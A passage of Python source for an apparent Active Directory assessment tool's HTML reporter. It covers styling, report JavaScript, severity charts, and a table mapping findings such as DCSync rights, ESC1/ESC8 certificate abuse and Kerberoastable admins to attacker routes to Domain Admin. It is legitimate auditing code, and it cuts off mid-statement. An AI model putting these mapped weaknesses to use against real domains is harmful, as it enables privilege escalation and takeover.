.kc-cat-card.kc-clickable{cursor:pointer;transition:border-color .12s,transform .08s}
.kc-cat-card.kc-clickable:hover{border-color:var(--accent);transform:translateY(-1px)}
.kc-invcols{display:grid;grid-template-columns:1fr 1fr;gap:22px;margin-top:8px}
@media(max-width:900px){.kc-invcols{grid-template-columns:1fr}}

/* privileged-accounts explorer */
.kc-pg{border:1px solid var(--border);border-radius:var(--r-sm);margin-bottom:8px;overflow:hidden}
.kc-pg-h{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--surface2);cursor:pointer}
.kc-pg-h:hover{background:var(--surface3)}
.kc-pg-ar{color:var(--accent);font-size:12px;width:12px}
.kc-pg-n{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--muted)}
.kc-pg-b{padding:0 4px 4px}
.kc-aflag{display:inline-block;font-family:var(--mono);font-size:9.5px;padding:1px 5px;border-radius:3px;
  border:1px solid var(--border2);color:var(--muted);margin:1px}
.kc-aflag.bad{color:var(--bad);border-color:rgba(189,66,52,.5)}
.kc-aflag.warn{color:var(--warn);border-color:rgba(205,165,43,.5)}
.kc-aflag.ok{color:var(--ok);border-color:rgba(130,161,85,.4)}
.kc-aflag.dis{color:var(--faint)}
tr.kc-notable td{background:rgba(189,66,52,.06)}

/* terminal-style evidence */
.kc-term{background:#0d0e08;border:1px solid var(--border2);border-radius:var(--r-sm);color:#cfe0a8;
  font-family:var(--mono);font-size:11.5px;line-height:1.5;padding:10px 12px;white-space:pre-wrap;
  word-break:break-word;max-height:340px;overflow:auto}
html[data-theme=light] .kc-term{background:#21250e;color:#dfe6c4}
.kc-term .t-ok{color:var(--accent)}

/* ── exec hero: posture grade + severity chips + meters ── */
.kc-hero{display:flex;gap:16px;flex-wrap:wrap;align-items:stretch;margin-bottom:18px}
.kc-grade{flex:0 0 auto;width:208px;display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:1px;border-radius:var(--r);background:var(--surface2);border:1px solid var(--border);
  border-top:3px solid var(--g,var(--accent));padding:14px 12px;text-align:center}
.kc-grade-ring{position:relative;width:118px;height:118px;display:flex;align-items:center;justify-content:center}
.kc-grade-ring svg{position:absolute;inset:0}
.kc-grade-letter{font-size:50px;font-weight:800;line-height:1;color:var(--g,var(--accent))}
.kc-grade-score{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--text);margin-top:5px}
.kc-grade-score small{color:var(--muted);font-weight:400}
.kc-grade-word{font-size:13px;font-weight:700;color:var(--g,var(--accent));margin-top:5px;line-height:1.2}
.kc-grade-cap{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);margin-top:3px}
.kc-hero-mid{flex:1;min-width:300px;display:flex;flex-direction:column;justify-content:center;gap:13px;
  background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:15px 18px}
.kc-sevchips{display:flex;gap:8px;flex-wrap:wrap}
.kc-sevchip{display:flex;align-items:center;gap:8px;background:var(--surface3);border:1px solid var(--border2);
  border-left:3px solid var(--c,var(--accent));border-radius:var(--r-sm);padding:5px 12px 5px 9px}
.kc-sevchip b{font-size:18px;font-weight:800;color:var(--c,var(--accent));font-variant-numeric:tabular-nums;line-height:1}
.kc-sevchip span{font-family:var(--mono);font-size:10px;letter-spacing:.05em;text-transform:uppercase;color:var(--muted)}
.kc-sevchip.zero{opacity:.45}
.kc-verdictline{font-family:var(--mono);font-size:11px;color:var(--muted)}
.kc-verdictline b{font-weight:700}

/* ── priorities (ranked by exploitability) + quick wins ── */
.kc-prio-grid{display:grid;grid-template-columns:1.45fr 1fr;gap:22px;align-items:start}
@media(max-width:1000px){.kc-prio-grid{grid-template-columns:1fr}}
.kc-prio,.kc-qw{list-style:none}
.kc-prio li{display:flex;align-items:center;gap:12px;padding:9px 0;border-bottom:1px dashed var(--border)}
.kc-prio li:last-child,.kc-qw li:last-child{border-bottom:none}
.kc-prio-rank{font-family:var(--mono);font-size:13px;font-weight:800;color:var(--faint);width:22px;text-align:right;flex-shrink:0}
.kc-prio-body{flex:1;min-width:0}
.kc-prio-title{font-weight:700;display:block;line-height:1.3}
.kc-prio-title a{color:var(--text)}
.kc-prio-note{color:var(--muted);font-size:12px}
.kc-prio-meta{display:flex;flex-direction:column;align-items:flex-end;gap:5px;flex-shrink:0;width:132px}
.kc-prio-tags{display:flex;gap:5px;align-items:center;flex-wrap:wrap;justify-content:flex-end}
.kc-xbar{width:124px;height:6px;background:var(--track);border-radius:3px;overflow:hidden}
.kc-xbar i{display:block;height:6px;border-radius:3px}
.kc-xlabel{font-family:var(--mono);font-size:9px;letter-spacing:.04em;text-transform:uppercase;color:var(--faint)}
.kc-qw li{display:flex;align-items:baseline;gap:9px;padding:8px 0;border-bottom:1px dashed var(--border)}
.kc-qw-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;transform:translateY(2px)}
.kc-qw-t{flex:1;min-width:0} .kc-qw-t a{color:var(--text);font-weight:600}
.kc-prio-empty{color:var(--muted);font-size:13px}

/* ── remediation-effort badge + framework chips ── */
.kc-effort{display:inline-block;font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:.04em;
  text-transform:uppercase;padding:1px 7px;border-radius:3px;border:1px solid var(--e,var(--border2));color:var(--e,var(--muted))}
.kc-fw{display:flex;flex-wrap:wrap;gap:5px;margin-top:2px}
.kc-fwgrp{display:flex;align-items:center;gap:5px;flex-wrap:wrap}
.kc-fwlbl{font-family:var(--mono);font-size:9px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
.kc-fwchip{font-family:var(--mono);font-size:10px;background:var(--surface2);border:1px solid var(--border2);
  color:var(--muted);border-radius:3px;padding:1px 6px}
.kc-fwchip.attck{color:var(--deck)}

/* ── rich affected-object table + inline CSV export ── */
.kc-aff-tbl{margin-top:4px}
.kc-aff-tools{display:flex;justify-content:flex-end;margin-top:7px}
.kc-csvbtn{font-family:var(--mono);font-size:10px;background:var(--surface3);border:1px solid var(--border2);
  color:var(--muted);border-radius:3px;padding:3px 10px;cursor:pointer}
.kc-csvbtn:hover{border-color:var(--accent);color:var(--accent)}
.kc-aff-more{color:var(--faint);font-size:11.5px;font-style:italic;margin-top:5px}

@media print{
  @page{size:A4;margin:13mm}
  html[data-theme]{--bg:#fff;--surface:#fff;--surface2:#f5f3ea;--surface3:#edebde;--border:#bbb;--border2:#999;
    --track:#e4e2d6;--text:#1a1a12;--muted:#444;--faint:#666;--shadow:none}
  body{background:#fff}
  .kc-nav,.kc-top,.kc-toolbar,.kc-iconbtn,.kc-copy,.kc-csvbtn{display:none!important}
  .kc-section{break-inside:avoid;box-shadow:none;border:1px solid #ccc}
  .kc-frow,.kc-drow{display:table-row!important}
  .kc-cmd li code{background:#f5f3ea;color:#1a1a12;border:1px solid #ccc}
  a{color:#21250e}
}
"""

_KC_JS = r"""
function kcTheme(){var h=document.documentElement;var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
  h.setAttribute('data-theme',n);try{localStorage.setItem('scout-theme',n)}catch(e){}}
(function(){try{var t=localStorage.getItem('scout-theme');if(t)document.documentElement.setAttribute('data-theme',t)}catch(e){}})();
function kcTog(i){var r=document.getElementById('dr-'+i),ic=document.getElementById('ic-'+i);if(!r)return;
  var open=r.style.display==='table-row';r.style.display=open?'none':'table-row';
  if(ic){ic.textContent=open?'+':'−';ic.style.background=open?'':'var(--accent)';ic.style.color=open?'':'#15170f';ic.style.borderColor=open?'':'var(--accent)';}}
function kcAll(open){document.querySelectorAll('.kc-drow').forEach(function(r){r.style.display=open?'table-row':'none'});
  document.querySelectorAll('.kc-toggle').forEach(function(ic){ic.textContent=open?'−':'+';
    ic.style.background=open?'var(--accent)':'';ic.style.color=open?'#15170f':'';ic.style.borderColor=open?'var(--accent)':'';});}
var kcF={sev:'',cat:''};
function kcFil(btn){var f=btn.getAttribute('data-f'),k=f.split(':')[0],v=f.substring(k.length+1);
  if(k==='sev'){document.querySelectorAll('.kc-fp:not(.kc-fp-cat)').forEach(function(b){b.classList.remove('kc-fp-on','on')});
    btn.classList.add(v?'on':'kc-fp-on');kcF.sev=v;}
  else{if(kcF.cat===v){kcF.cat='';btn.classList.remove('on');}else{document.querySelectorAll('.kc-fp-cat').forEach(function(b){b.classList.remove('on')});btn.classList.add('on');kcF.cat=v;}}
  kcApply();}
function kcApply(){var qel=document.getElementById('kc-q');var q=(qel?qel.value:'').toLowerCase();var shown=0,tot=0;
  document.querySelectorAll('.kc-frow').forEach(function(r){tot++;
    var okS=!kcF.sev||r.getAttribute('data-sev')===kcF.sev;
    var okC=!kcF.cat||r.getAttribute('data-cat')===kcF.cat;
    var okQ=!q||r.textContent.toLowerCase().indexOf(q)!==-1;
    var ok=okS&&okC&&okQ;r.style.display=ok?'':'none';if(ok)shown++;
    var dr=document.getElementById('dr-'+r.getAttribute('data-i'));if(dr&&!ok)dr.style.display='none';});
  var s=document.getElementById('kc-showing');if(s)s.textContent='Showing '+shown+' of '+tot+' findings';}
function kcJump(id){var el=document.getElementById(id);if(!el)return;
  el.scrollIntoView({behavior:'smooth',block:'center'});
  if(el.classList.contains('kc-frow')){var i=el.getAttribute('data-i');var dr=document.getElementById('dr-'+i);
    if(dr&&dr.style.display!=='table-row')kcTog(i);}}
function kcCopy(btn){var code=btn.parentNode.querySelector('code');if(!code)return;
  navigator.clipboard&&navigator.clipboard.writeText(code.textContent);
  var o=btn.textContent;btn.textContent='copied';setTimeout(function(){btn.textContent=o},1200);}
function kcRowTog(id){var b=document.getElementById(id),ar=document.getElementById('ar-'+id);if(!b)return;
  var open=b.style.display!=='none';b.style.display=open?'none':'block';if(ar)ar.textContent=open?'▸':'▾';}
function kcCatJump(cat){document.querySelectorAll('.kc-fp-cat').forEach(function(b){
    if(b.getAttribute('data-f')==='cat:'+cat){if(!b.classList.contains('on'))b.click();}});
  var s=document.getElementById('sec-findings');if(s)s.scrollIntoView({behavior:'smooth',block:'start'});}
document.addEventListener('DOMContentLoaded',function(){kcApply();
  var secs=[].slice.call(document.querySelectorAll('section[id]'));
  var links={};document.querySelectorAll('.kc-nav-links a').forEach(function(a){links[a.getAttribute('href').slice(1)]=a;});
  function spy(){var y=window.scrollY+110,cur=null;secs.forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
    Object.keys(links).forEach(function(k){links[k].classList.toggle('active',k===cur);});}
  window.addEventListener('scroll',spy);spy();});
/* ── control-path node detail drawer (PingCastle-style drill-down) ── */
function kcEsc(s){return String(s==null?'':s).replace(/[&<>"']/g,function(c){
  return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
function kcAge(d){return d==null?'—':(d+'d');}
function kcStat(v){return v===false?'<span class="kc-bad">disabled</span>':
  (v===true?'<span class="kc-ok">enabled</span>':'—');}
function kcNode(el){
  var name=el.getAttribute('data-node');var m=(window.KC_NODES||{})[name];
  var dw=document.getElementById('kc-drawer'),ov=document.getElementById('kc-drawer-ov');
  var body=document.getElementById('kc-dw-body'),ttl=document.getElementById('kc-dw-name');
  if(!dw||!body||!ttl)return;ttl.textContent=name;
  if(!m){body.innerHTML='<p class="kc-dw-note">No additional detail was collected for this node.</p>';}
  else{
    var h='<div style="margin-bottom:8px"><span class="kc-dw-badge'+(m.tier0?' t0':'')+'">'+kcEsc(m.type||'object')+'</span>';
    if(m.tier0)h+='<span class="kc-dw-badge t0">Tier 0</span>';h+='</div>';
    if(m.note)h+='<div class="kc-dw-note">'+kcEsc(m.note)+'</div>';
    if(m.type==='user'||m.type==='computer'){
      h+='<dl class="kc-dw-facts">'+
         '<dt>Enabled</dt><dd>'+kcStat(m.enabled)+'</dd>'+
         '<dt>Password age</dt><dd>'+kcAge(m.pwd_age)+'</dd>'+
         '<dt>Last logon</dt><dd>'+(m.logon_age==null?'never / unknown':kcAge(m.logon_age))+'</dd>'+
         '<dt>Kerberoastable</dt><dd>'+(m.spn?'<span class="kc-bad">yes (has SPN)</span>':'no')+'</dd>'+
         '<dt>Stale</dt><dd>'+(m.stale?'<span class="kc-warn">yes (&gt;90d / never)</span>':'no')+'</dd>'+
         (m.sid?'<dt>SID</dt><dd class="kc-mono" style="font-size:11px">'+kcEsc(m.sid)+'</dd>':'')+'</dl>';
    }else if(m.type==='group'){
      var mem=m.members||[];
      h+='<div class="kc-dw-note">'+(m.member_count||0)+' direct member(s)'+
         (mem.length<(m.member_count||0)?(' (showing first '+mem.length+')'):'')+'.</div>';
      if(mem.length){
        h+='<table class="kc-dw-mt"><thead><tr><th>Member</th><th>Status</th><th>Pwd age</th><th>Last logon</th><th>Flags</th></tr></thead><tbody>';
        mem.forEach(function(mm){var fl=[];if(mm.spn)fl.push('kerberoastable');if(mm.stale)fl.push('stale');
          h+='<tr'+(mm.stale?' class="stale"':'')+'><td>'+kcEsc(mm.sam)+'</td><td>'+kcStat(mm.enabled)+
             '</td><td>'+kcAge(mm.pwd_age)+'</td><td>'+(mm.logon_age==null?'—':kcAge(mm.logon_age))+
             '</td><td>'+kcEsc(fl.join(', '))+'</td></tr>';});
        h+='</tbody></table>';
      }
      if(m.sid)h+='<div class="kc-mono" style="font-size:11px;color:var(--faint);margin-top:8px">'+kcEsc(m.sid)+'</div>';
    }else if(m.sid){
      h+='<dl class="kc-dw-facts"><dt>SID</dt><dd class="kc-mono" style="font-size:11px">'+kcEsc(m.sid)+'</dd></dl>';
    }
    body.innerHTML=h;
  }
  dw.classList.add('open');if(ov)ov.classList.add('open');dw.scrollTop=0;
}
function kcCloseDrawer(){var dw=document.getElementById('kc-drawer'),ov=document.getElementById('kc-drawer-ov');
  if(dw)dw.classList.remove('open');if(ov)ov.classList.remove('open');}
document.addEventListener('keydown',function(e){if(e.key==='Escape')kcCloseDrawer();});
/* ── inline CSV export of an affected-items table ── */
function kcCsv(btn){
  var wrap=btn.closest('.kc-aff-tbl');if(!wrap)return;
  var tbl=wrap.querySelector('table');if(!tbl)return;
  var rows=[];
  tbl.querySelectorAll('tr').forEach(function(tr){
    var cells=[];
    tr.querySelectorAll('th,td').forEach(function(c){
      var t=(c.textContent||'').replace(/\s+/g,' ').trim();
      if(/^[=+\-@\t\r]/.test(t))t="'"+t;
      if(/[",\n]/.test(t))t='"'+t.replace(/"/g,'""')+'"';
      cells.push(t);});
    if(cells.length)rows.push(cells.join(','));});
  var blob=new Blob([rows.join('\r\n')],{type:'text/csv'});
  var url=URL.createObjectURL(blob);var a=document.createElement('a');
  a.href=url;a.download=(btn.getAttribute('data-fn')||'scout-affected')+'.csv';
  document.body.appendChild(a);a.click();document.body.removeChild(a);
  setTimeout(function(){URL.revokeObjectURL(url)},1000);
  var o=btn.textContent;btn.textContent='exported ✓';setTimeout(function(){btn.textContent=o},1300);
}
"""


class HTMLReporter:
    """Renders findings and scores into a single self-contained HTML report
    (no external assets)."""

    _SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

    def __init__(self, domain, dc_ip, findings, scores, data,
                 auth_mode="", prepared_by="", scope=""):
        self.domain   = domain
        self.dc_ip    = dc_ip
        self.findings = findings
        self.scores   = scores
        self.data     = data
        self.auth_mode = auth_mode
        self.prepared_by = prepared_by
        self.scope    = scope
        self.ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.date     = datetime.datetime.now().strftime("%d %b %Y")
        self.by_rule = {}
        for f in findings:
            self.by_rule.setdefault(f.rule_id, f)
        # sAMAccountName(lower) -> object, for resolving a finding's affected
        # strings back to their user/computer object (rich affected tables).
        self._obj_index = {}
        try:
            for o in list(getattr(data, "users", []) or []) + list(getattr(data, "computers", []) or []):
                sam = get_str(o["attrs"], "sAMAccountName")
                if sam:
                    self._obj_index.setdefault(sam.lower(), o)
        except Exception:
            self._obj_index = {}

    # ── helpers ───────────────────────────────────────────────────────────────
    def _e(self, s):
        return html_mod.escape(str(s) if s is not None else "")

    def _doc(self, rule_id):
        return RULE_DOCS.get(rule_id, {})

    def _sev_counts(self):
        c = defaultdict(int)
        for f in self.findings:
            c[f.severity] += 1
        return c

    def _donut(self):
        counts = self._sev_counts()
        order = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
        total = sum(counts[s] for s in order) or 1
        cx = cy = 64; r = 48; w = 20
        nonzero = [s for s in order if counts[s]]
        segs = []; start = -90.0
        if len(nonzero) == 1:
            segs.append(f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="{SEV_COLOR[nonzero[0]]}" stroke-width="{w}"/>')
        else:
            for s in nonzero:
                sweep = counts[s] / total * 360; end = start + sweep
                large = 1 if sweep > 180 else 0
                x1 = cx + r*math.cos(math.radians(start)); y1 = cy + r*math.sin(math.radians(start))
                x2 = cx + r*math.cos(math.radians(end));   y2 = cy + r*math.sin(math.radians(end))
                segs.append(f'<path d="M {x1:.2f} {y1:.2f} A {r} {r} 0 {large} 1 {x2:.2f} {y2:.2f}" '
                            f'fill="none" stroke="{SEV_COLOR[s]}" stroke-width="{w}"/>')
                start = end
        if not nonzero:
            segs.append(f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="var(--track)" stroke-width="{w}"/>')
        return ('<svg width="128" height="128" viewBox="0 0 128 128" aria-hidden="true">' + "".join(segs) +
                f'<text x="{cx}" y="{cy-2}" text-anchor="middle" font-size="28" font-weight="800" fill="var(--text)" font-family="Segoe UI, Arial, sans-serif">{len(self.findings)}</text>'
                f'<text x="{cx}" y="{cy+15}" text-anchor="middle" font-size="10" fill="var(--muted)" font-family="Segoe UI, Arial, sans-serif">findings</text></svg>')

    # ── slim header / nav ──────────────────────────────────────────────────────
    def _head(self):
        return (
            '<header class="kc-head" id="top">'
            '<span class="mark">✶</span>'
            f'<span class="name">{TOOL_NAME}</span>'
            f'<span class="full">{self._e(TOOL_LONG)}</span>'
            '<span class="class">CONFIDENTIAL</span>'
            '</header>')

    def _nav(self):
        items = [("summary","Summary",""),("priorities","Priorities",""),
                 ("paths","Attack Paths",""),("priv","Privileged",""),
                 ("findings","Findings",str(len(self.findings)))]
        links = ""
        for sid, name, badge in items:
            b = f'<span class="kc-navb">{badge}</span>' if badge else ""
            links += f'<a href="#sec-{sid}">{name}{b}</a>'
        return ('<nav class="kc-nav" id="kc-nav">'
                f'<div class="kc-nav-links">{links}</div>'
                '<div class="kc-nav-tools">'
                '<button class="kc-iconbtn" onclick="kcTheme()" title="Toggle theme">◐</button>'
                '<button class="kc-iconbtn" onclick="window.print()" title="Print / Save PDF">⎙</button>'
                '</div></nav>')

    # ── summary ────────────────────────────────────────────────────────────────
    _MARQUEE = {
        "P-GPPPassword":"recoverable GPP passwords in SYSVOL",
        "P-DCSync":"DCSync rights granted to non-admins",
        "A-CertTempCustomSubject":"an ESC1-exploitable certificate template",
        "A-CertTemplateESC4":"an ESC4 template-ACL takeover",
        "A-CertEnrollHttp":"ESC8 HTTP certificate enrollment (relayable)",
        "P-UnconstrainedDelegation":"unconstrained Kerberos delegation",
        "A-WDigest":"WDigest cleartext credential caching",
        "A-LMCompatibilityLevel":"NTLMv1 still permitted",
        "P-ServiceDomainAdmin":"service accounts in Domain Admins",
        "S-KerberoastableAdmin":"Kerberoastable administrator accounts",
        "S-SIDHistoryPrivileged":"privileged SID-history backdoors",
        "P-ComputerInPrivGroup":"computer accounts inside privileged groups",
        "A-MembershipEveryone":"'Everyone' inside a privileged group",
        "P-RBCD-Dangerous":"resource-based delegation on a domain controller",
        "A-DC-Coerce":"a DC authentication-coercion vector",
        "A-SCCM":"relayable SCCM/MECM site infrastructure",
        "A-Pre2kComputer":"pre-staged computer accounts with default passwords",
        "A-WeakLockout":"no account lockout (password spraying is free)",
    }

    def _dossier(self):
        rows = [("Target domain", self.domain), ("Domain controller", self.dc_ip),
                ("Authentication", self.auth_mode or "n/a"), ("Assessed", self.date)]
        if self.prepared_by:
            rows.append(("Operator", self.prepared_by))
        if self.scope:
            rows.append(("Scope", self.scope))
        d = self.data
        try:
            dfl = FUNCTIONAL_LEVELS.get(d.domain_level, str(d.domain_level))
            rows.append(("Functional level", dfl))
        except Exception:
            pass
        rows.append(("Objects", f"{len(d.users)} users · {len(d.computers)} computers · {len(d.dcs)} DC(s)"))
        rows.append(("Findings", f"{len(self.findings)} total"))
        rows.append(("Tool", f"{TOOL_NAME} v{VERSION}"))
        body = "".join(f'<tr><td>{self._e(k)}</td><td>{self._e(v)}</td></tr>' for k, v in rows)
        return ('<div class="kc-dossier"><div class="kc-dossier-h">Assessment dossier</div>'
                f'<table><tbody>{body}</tbody></table></div>')

    def _sev_legend(self):
        sc = self._sev_counts(); out = '<div class="kc-legend">'
        for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if sc.get(s,0):
                out += f'<span><i style="background:{SEV_COLOR[s]}"></i>{s.title()} {sc[s]}</span>'
        return out + '</div>'

    def _meter(self, label, value, hint):
        _, col = RiskScorer.risk_label(value)
        return (f'<div><div class="kc-meter-h"><b>{self._e(label)} '
                f'<small>{self._e(hint)}</small></b><span class="v" style="color:{col}">{value}<small>/100</small></span></div>'
                f'<div class="kc-meter-t"><div class="kc-meter-f" style="width:{value}%;background:{col}"></div></div></div>')

    def _grade_ring(self, posture, color):
        """SVG progress ring around the grade letter (posture fraction)."""
        cx = cy = 59; r = 52
        frac = max(0.0, min(1.0, posture / 100.0))
        circ = 2 * math.pi * r
        return (f'<svg width="118" height="118" viewBox="0 0 118 118" aria-hidden="true">'
                f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="var(--track)" stroke-width="9"/>'
                f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="{color}" stroke-width="9" '
                f'stroke-linecap="round" stroke-dasharray="{circ*frac:.1f} {circ:.1f}" '
                f'transform="rotate(-90 {cx} {cy})"/></svg>')

    def _sev_chips(self):
        sc = self._sev_counts()
        names = {"CRITICAL":"Crit","HIGH":"High","MEDIUM":"Med","LOW":"Low","INFO":"Info"}
        chips = ""
        for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
            n = sc.get(s, 0)
            if s == "INFO" and not n:
                continue
            chips += (f'<div class="kc-sevchip{"" if n else " zero"}" style="--c:{SEV_COLOR[s]}">'
                      f'<b>{n}</b><span>{names[s]}</span></div>')
        return f'<div class="kc-sevchips">{chips}</div>'

    def _scoreband(self):
        s = self.scores
        exp = s.get("exposure",0); hyg = s.get("hygiene",0)
        pos = s.get("posture",0); letter = s.get("grade","?"); gword = s.get("grade_word","")
        _, _, gcol = RiskScorer.grade(pos)
        word, vcol = RiskScorer.verdict(exp)
        grade_card = (f'<div class="kc-grade" style="--g:{gcol}">'
                      f'<div class="kc-grade-ring">{self._grade_ring(pos, gcol)}'
                      f'<div class="kc-grade-letter">{self._e(letter)}</div></div>'
                      f'<div class="kc-grade-score">{pos}<small>/100</small></div>'
                      f'<div class="kc-grade-word">{self._e(gword)}</div>'
                      '<div class="kc-grade-cap">Posture score</div></div>')
        mid = ('<div class="kc-hero-mid">'
               f'{self._sev_chips()}'
               f'{self._meter("Exposure", exp, "easiest path to Tier 0")}'
               f'{self._meter("Hygiene debt", hyg, "misconfiguration & stale-object load")}'
               f'<div class="kc-verdictline">Exposure verdict: '
               f'<b style="color:{vcol}">{self._e(word)}</b> · higher posture = stronger AD</div>'
               '</div>')
        readout = ('<div class="kc-readout"><div class="col">'
                   f'{self._donut()}{self._sev_legend()}</div></div>')
        return f'<div class="kc-hero">{grade_card}{mid}{readout}</div>'

    def _narrative(self):
        s = self.scores
        exp = s.get("exposure",0); hyg = s.get("hygiene",0)
        word, vcol = RiskScorer.verdict(exp)
        sc = self._sev_counts(); crit, high = sc.get("CRITICAL",0), sc.get("HIGH",0)
        if exp >= 85:    estate = "an attacker on the internal network can reach Domain Admin in a single, low-skill step"
        elif exp >= 60:  estate = "a clear, reliable path to Domain Admin exists"
        elif exp >= 35:  estate = "Tier-0 is reachable but requires cracking, coercion or a foothold first"
        elif exp >= 15:  estate = "no direct path was found, but exploitable footholds exist"
        else:            estate = "no practical path to Tier-0 was identified from the collected data"
        parts = [
            f"Exposure is <strong style=\"color:{vcol}\">{exp}/100 — {self._e(word)}</strong>: {estate}. "
            f"Hygiene debt is <strong>{hyg}/100</strong>, across <strong>{len(self.findings)}</strong> "
            f"findings ({crit} critical, {high} high) on <strong>{self._e(self.domain)}</strong>.",
        ]
        marquee = [t for r, t in self._MARQUEE.items() if r in self.by_rule]
        if marquee:
            sm = marquee[:4]
            parts.append("Immediate exploitation is available via " +
                         (", ".join(sm[:-1]) + " and " + sm[-1] if len(sm) > 1 else sm[0]) +
                         " — see Attack Paths for the routes to Tier 0.")
        else:
            parts.append("No single-step takeover primitives were found from the collected data.")
        return "".join(f"<p>{p}</p>" for p in parts)

    def _key_risks(self):
        seen = set(); items = []
        for f in sorted(self.findings, key=lambda x:(self._SEV_ORDER.get(x.severity,9), -x.points)):
            if f.rule_id in seen or f.severity not in ("CRITICAL","HIGH"):
                continue
            seen.add(f.rule_id); items.append(f)
            if len(items) >= 7:
                break
        if not items:
            return ""
        rows = ""
        for f in items:
            one = (self._doc(f.rule_id).get("description") or f.details or f.title)
            one = one if len(one) <= 130 else one[:127] + "…"
            rows += (f'<li><span class="kc-dot" style="background:{f.sev_color}"></span>'
                     f'<span style="flex:1"><a href="#f-{self._e(f.rule_id)}" onclick="kcJump(\'f-{self._e(f.rule_id)}\');return false"><strong>{self._e(f.title)}</strong></a> '
                     f'<span class="kc-kr-sub">{self._e(one)}</span></span></li>')
        return ('<div class="kc-keyrisks"><div class="kc-sub-h">Key risks at a glance</div>'
                f'<ul>{rows}</ul></div>')

    def _opcat(self, f):
        return op_category(f.rule_id, f.category)

    def _category_strip(self):
        # Finding counts per OPERATIONAL category (how a pentester groups work),
        # with a severity breakdown — informational, not a fake 0-100 gauge.
        sev_by_cat = {c: defaultdict(int) for c in OPCAT_ORDER}
        tot = defaultdict(int)
        for f in self.findings:
            oc = self._opcat(f)
            if oc in sev_by_cat:
                sev_by_cat[oc][f.severity] += 1; tot[oc] += 1
        cards = ""
        for cat in OPCAT_ORDER:
            n = tot.get(cat,0); ccol = OPCAT_COLOR.get(cat,"#888")
            bd = sev_by_cat[cat]
            chips = "".join(
                f'<span style="color:{SEV_COLOR[s]};font-family:var(--mono);font-size:10.5px;margin-right:8px">{bd[s]} {s[:4].lower()}</span>'
                for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO") if bd.get(s))
            cards += (f'<div class="kc-cat-card kc-clickable" style="border-top-color:{ccol}" '
                      f'onclick="kcCatJump(\'{self._e(cat)}\')" title="Filter the Findings table to {self._e(cat)}">'
                      f'<div class="kc-cat-score" style="color:{ccol}">{n}</div>'
                      f'<div class="kc-cat-label">{self._e(cat)}</div>'
                      f'<div class="kc-cat-count">{chips or "clean"}</div></div>')
        return ('<div class="kc-sub-h">Findings by operation <span style="font-weight:400;'
                'text-transform:none;letter-spacing:0;color:var(--faint)">— count per area; click to filter</span></div>'
                f'<div class="kc-catstrip">{cards}</div>')

    def _collection_notes(self):
        """Surface per-query collection failures so an empty section can't be
        mistaken for a clean result (roadmap item 6)."""
        errs = getattr(self.data, "collect_errors", None) or []
        if not errs:
            return ""
        items = "".join(f'<li>{self._e(e)}</li>' for e in errs[:30])
        more = f'<li class="kc-more">… and {len(errs)-30} more</li>' if len(errs) > 30 else ""
        return ('<div class="kc-block" style="border-left:3px solid var(--warn);'
                'background:rgba(205,165,43,.08);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0;margin-top:14px">'
                '<div class="kc-bh" style="color:var(--warn)">Collection notes — some queries failed; '
                'affected areas may be under-reported</div>'
                f'<ul class="kc-fixlist">{items}{more}</ul></div>')

    def _summary_section(self):
        return ('<section class="kc-section" id="sec-summary"><h2 class="kc-h2">Summary'
                '<span class="tag">exposure = easiest path to Tier 0 · hygiene = misconfig load</span></h2>'
                f'{self._scoreband()}'
                '<div class="kc-summary2">'
                f'{self._dossier()}'
                f'<div><div class="kc-narrative">{self._narrative()}</div>{self._key_risks()}</div>'
                '</div>'
                f'{self._category_strip()}'
                f'{self._inventory_block()}'
                f'{self._collection_notes()}</section>')

    # ── Priorities: top priorities (ranked by exploitability) + quick wins ────
    _PSEUDO_WEIGHT = {"CRITICAL":80, "HIGH":55, "MEDIUM":30, "LOW":12, "INFO":0}

    def _attacker_note(self, f):
        """One-line 'here's how this gets you owned' blurb for the priorities list."""
        note = self._MARQUEE.get(f.rule_id)
        if note:
            return note[0].upper() + note[1:]
        doc = self._doc(f.rule_id)
        txt = doc.get("why") or doc.get("description") or f.details or ""
        return txt if len(txt) <= 116 else txt[:113] + "…"

    def _effort_badge(self, rule_id):
        e = rule_effort(rule_id); col = EFFORT_COLOR.get(e, "var(--muted)")
        return (f'<span class="kc-effort" style="--e:{col}" '
                f'title="Estimated remediation effort">{self._e(e)} effort</span>')

    def _priorities_section(self):
        uniq = list(self.by_rule.values())
        # Top priorities — ranked by exploitability: EXPOSURE_WEIGHTS is the
        # attacker's effort-to-Tier-0 (higher = easier). To order by real attacker
        # impact while never silently dropping a high-severity finding, we include
        # every exposure-weighted path AND every CRITICAL/HIGH finding, ranking by
        # the weight where modelled and falling back to a severity proxy otherwise
        # (the same key Quick Wins uses, so a CRIT/HIGH can't score 0 and vanish).
        # Rank by the same value we display: the modelled exploitability weight
        # where we have one, else a severity proxy — so the list stays monotonic
        # (a shown "exploitability 64" can't sort above a shown "72").
        def prio_key(f):
            return EXPOSURE_WEIGHTS.get(f.rule_id, 0) or self._PSEUDO_WEIGHT.get(f.severity, 0)
        ranked = sorted(
            [f for f in uniq if EXPOSURE_WEIGHTS.get(f.rule_id, 0) > 0 or f.severity in ("CRITICAL","HIGH")],
